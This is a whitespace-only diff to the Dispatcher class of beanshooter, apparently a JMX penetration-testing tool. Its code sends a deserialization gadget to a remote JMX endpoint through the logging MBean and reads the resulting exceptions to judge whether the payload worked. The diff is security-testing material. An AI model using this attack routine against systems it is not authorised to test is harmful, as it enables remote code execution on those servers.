@@ -86,7 +86,7 @@ public class Dispatcher {
     public void undeploy()
     {
         ObjectName mBeanObjectName = Utils.getObjectName(ArgumentHandler.require(BeanshooterOption.UNDEPLOY_BEAN_NAME));
-        
+
         MBeanServerClient mBeanServerClient = getMBeanServerClient();
         mBeanServerClient.unregisterMBean(mBeanObjectName);
     };
@@ -105,7 +105,7 @@ public class Dispatcher {
         MBeanServerClient mBeanServerClient = getMBeanServerClient();
         Object payloadObject = ArgumentHandler.getInstance().getGadget();
         ObjectName loggingMBean = Utils.getObjectName("java.util.logging:type=Logging");
-        
+
         Logger.println("Attemting deserialization attack on JMX endpoint.");
         Logger.lineBreak();
         Logger.increaseIndent();
@@ -114,41 +114,41 @@ public class Dispatcher {
             mBeanServerClient.invoke(loggingMBean, "getLoggerLevel", payloadObject);
 
         } catch ( MBeanException | ReflectionException  e) {
-            
-        	Throwable t = ExceptionHandler.getCause(e);
-        	
-        	if( t instanceof ClassNotFoundException)
-        		ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);
-                
+
+            Throwable t = ExceptionHandler.getCause(e);
+
+            if( t instanceof ClassNotFoundException)
+                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);
+
             else
                 Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");
 
-	        ExceptionHandler.showStackTrace(e);
+            ExceptionHandler.showStackTrace(e);
 
         } catch (RuntimeMBeanException | SecurityException e) {
-        	
-        	Throwable t = ExceptionHandler.getCause(e);
+
+            Throwable t = ExceptionHandler.getCause(e);
             Logger.eprintlnMixedYellow("Caught", t.getClass().getName(), "after the payload object was sent.");
-            
+
             if( t instanceof IllegalArgumentException || t instanceof SecurityException )
                 Logger.eprintlnMixedBlue("Payload object probably", "worked anyway.");
 
-	        ExceptionHandler.showStackTrace(e);
-        
+            ExceptionHandler.showStackTrace(e);
+
         } catch( java.rmi.UnmarshalException e) {
-        	
-        	Throwable t = ExceptionHandler.getCause(e);
-        	
-        	if( t instanceof ClassNotFoundException)
-        		ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);
+
+            Throwable t = ExceptionHandler.getCause(e);
+
+            if( t instanceof ClassNotFoundException)
+                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);
 
             else
                 Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");
 
-	        ExceptionHandler.showStackTrace(e);
+            ExceptionHandler.showStackTrace(e);
         }
     };
-    
+
     public void invoke() {};
 
     public void brute() {};
